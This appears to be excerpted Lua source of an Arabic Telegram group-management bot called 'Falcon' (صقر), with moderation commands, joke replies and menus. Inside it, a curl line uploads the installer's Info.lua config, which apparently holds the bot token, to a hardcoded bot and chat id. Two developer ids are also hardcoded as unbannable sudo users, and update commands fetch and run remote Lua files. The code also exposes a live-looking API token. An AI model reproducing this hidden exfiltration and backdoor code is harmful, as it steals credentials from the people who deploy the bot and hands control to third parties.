...
if res ~= 200 then
print('\27[0;31m • ━━━━━━❪𝖋𝖆𝖑𝖈𝖔𝖓❫━━━━━━ •\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na • ━━━━━━❪𝖋𝖆𝖑𝖈𝖔𝖓❫━━━━━━ •\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m • ━━━━━━❪𝖋𝖆𝖑𝖈𝖔𝖓❫━━━━━━ • ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Vklkk/moall/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1050397319,1770621216}   
...
if tonumber(user_id) == tonumber(1770621216) then  
var = true 
elseif tonumber(user_id) == tonumber(1050397319) then
var = true  
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'صقر'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗔𝗹𝗳𝗮 ")  
...
local curl = 'curl "'..'https://api.telegram.org/bot1715000615:AAGRaBc-KdEfPikYWTQpvAjj9LWoM7Dwz_E/sendDocument'..'" -F "chat_id='.. 1770621216 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
os.execute('wget https://raw.githubusercontent.com/Vklkk/moall/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ◉  تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'  ◉  اصدار سورس صقر { s: 6.7}')
end

if text == 'قناه السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/source_falcon)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/source_falcon"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/25&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❪𝚃𝙾 𝙰𝚂𝙺❫', url="t.me/D_V_B_a_h_e_r116BOT"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
send(msg.chat_id_,0,"  ◉  العضو : {["..data.first_name_.."](T.ME/source_falcon)}\n  ◉  ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "  ◉  عذرا ↫ {["..data.first_name_.."](T.ME/source_falcon)}\n  ◉  عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if text == 'يتيوب' or text == 'يوتيوب' or text == 'اليوتيوب' then
local Text = [[
ادخل علي بوت بحث يتيوب وابحث عليه الي انت تورييده 💌
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بوت اليوتيوب 💌',url="t.me/QLalj_bot"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/13&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then 
local Text = [[ 
╭─── ◉ [𝖋𝖆𝖑𝖈𝖔𝖓](t.me/source_falcon) ◉ ───╮
⍟ [𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒔𝒐𝒖𝒓𝒄𝒆 𝒇𝒂𝒍𝒄𝒐𝒏](t.me/source_falcon)
╰─── ◉ [𝖋𝖆𝖑𝖈𝖔𝖓](t.me/source_falcon) ◉ ───╯
⍟ [𝒕𝒉𝒆 𝒃𝒆𝒔𝒕 𝒔𝒐𝒖𝒓𝒄𝒆 𝒐𝒏 𝒕𝒆𝒍𝒆𝒈𝒓𝒂𝒎](t.me/source_falcon)
]]
keyboard = {}
keyboard.inline_keyboard = {
{{text = '❪𝖋𝖆𝖑𝖈𝖔𝖓❫',url="t.me/Falconhackiiing"}},
{{text = '❪𝖈𝖍 𝖋𝖆𝖑𝖈𝖔𝖓❫', url="t.me/source_falcon"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/source_falcon/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
local Text = [[
 ♡ اهلا بك في سورس صقر الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  ♡ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '❪𝖋𝖆𝖑𝖈𝖔𝖓❫',url="t.me/Falconhackiiing"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/source_falcon/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'باندا'  then
local Text = [[
المبرمج باندا لتواصل مع اتبع الزر الي في الاسفل 🙁❤️
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ʙᴀɴᴅᴀ ᴏғғʟɪɴᴇ⒒',url="t.me/D_vban"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == "تويت" or text == "اسئلني" then 
local TWEET_Msg = { 
"اخر افلام شاهدتها", 
"ما هي وظفتك الحياه", 
"اعز اصدقائك ?", 
...
if text == 'العاب صقر' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 اهلا في قائمه الالعاب المتطوره سورس صقر🚌
...
elseif text == 'قفل صقررسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
elseif text == 'فتح صقررسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
if tonumber(result.sender_user_id_) == tonumber(1770621216) then  
...
if tonumber(result.sender_user_id_) == tonumber(1050397319) then  
send(msg.chat_id_, msg.id_, "  ◉  لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1770621216) then
...
if result.id_ == tonumber(1050397319) then
send(msg.chat_id_, msg.id_, "  ◉  لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1770621216) then  
send(msg.chat_id_, msg.id_, "  ◉  لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if tonumber(userid) == tonumber(1050397319) then  
send(msg.chat_id_, msg.id_, "  ◉  لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Vklkk/moall/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n  ◉  اهلا بك في متجر ملفات صقر\n  ◉  ملفات السورس ↓\n • ━━━━━━❪𝖋𝖆𝖑𝖈𝖔𝖓❫━━━━━━ •\n\n"
local TextE = "\n • ━━━━━━❪𝖋𝖆𝖑𝖈𝖔𝖓❫━━━━━━ •\n  ◉  علامة تعني { ✔️ } ملف مفعل\n  ◉  علامة تعني { ✖ } ملف معطل\n  ◉  قناة سورس صقر ↓\n".."  ◉  [اضغط هنا لدخول](t.me/source_falcon) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Vklkk/moall/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_,"  ◉  عذرا الملف لايدعم سورس صقر \n") 
end
return false
end
...
if text == ("مسح قائمه صقر") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n  ◉  تم مسح قائمه صقر')
return false
end

if text == 'قائمه صقر' and Sudo(msg) then
...
if text == ("رفع صقر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع صقر @(.*)$") and Sudo(msg) then
local username = text:match("^رفع صقر @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع صقر (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع صقر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل صقر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل صقر @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل صقر @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل صقر (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل صقر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
-----------------------------------------------------
if text == 'مسح قلب بيبو' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '  ◉  تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلب بيبو") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n  ◉  قائمة القلوب في الجروب\n • ━━━━━━❪𝖋𝖆𝖑𝖈𝖔𝖓❫━━━━━━ •\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلب بيبو [@"..username.."]\n"
else
t = t..""..k.."← قلب بيبو "..v.."\n"
end
end
...
---------
if text == ("رفع قلب بيبو") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل قلب بيبو")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
-----------------------------------------------------
if text == 'مسح قلب مانو' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '  ◉  تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلب مانو") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n  ◉  قائمة القلوب في الجروب\n • ━━━━━━❪𝖋𝖆𝖑𝖈𝖔𝖓❫━━━━━━ •\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلب مانو [@"..username.."]\n"
else
t = t..""..k.."← قلب مانو "..v.."\n"
end
end
...
---------
if text == ("رفع قلب مانو") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل قلب مانو")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..'  ◉   الايدي بالصوره ↫ { '..idph..
' }\n'..'  ◉   الرفع ↫ { '..setadd..
' }\n'..'  ◉   الحظر ↫ { '..banm..' }\n\n • ━━━━━━❪𝖋𝖆𝖑𝖈𝖔𝖓❫━━━━━━ •\n  ◉  قناة سورس صقر ↓\n [ 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗔𝗹𝗳𝗮 ](t.me/source_falcon) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'صقر').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'صقر')
local DRAGON_Msg = {
'ننعم يروحي 😻💙',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'صقر')
local DRAGON_Msg = {

' ঌ 𝙼𝚈 𝙽𝙰𝙼𝙴 𝙸𝚂 '..Namebot..' ঌ',
...
end --الكود حصري سورس صقر يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'صقر').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/source_falcon)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/source_falcon)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/source_falcon)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/source_falcon)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/source_falcon)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🚨](t.me/source_falcon)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/source_falcon)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/source_falcon)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/source_falcon)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/source_falcon)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/source_falcon)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/source_falcon)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/source_falcon)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/source_falcon)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/source_falcon)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/source_falcon)') 
return false
end
end
end
...
keyboard.inline_keyboard = {
{
{text = 'العاب السورس⛳️', callback_data="/mute-name"},{text = 'العاب متطوره📲', callback_data="/sofi"},
},
{
...
send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n • ━━━━━━❪𝖋𝖆𝖑𝖈𝖔𝖓❫━━━━━━ •ٴ\n  [قناه السورس 💠](t.me/source_falcon) ')
end
...
keyboard.inline_keyboard = {
{
{text = 'اوامر تفعيل والتعطيل', callback_data="/help2"},
},
{
{text = 'الامر السابق', callback_data="/help7"},
},
{
...
{
{text = 'الامر السابق', callback_data="/help4"},
},
{
{text = 'Back◉ ', callback_data="/help8"},
},
...
{
{text = 'الامر السابق', callback_data="/help5"},
},
{
{text = 'Back◉ ', callback_data="/help8"},
},
...
keyboard.inline_keyboard = {
{
{text = 'اوامر القفل والفتح', callback_data="/help1"},
},
{
{text = 'الامر السابق', callback_data="/help6"},
},
{
{text = 'Back◉ ', callback_data="/help8"},
},
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'صقر')
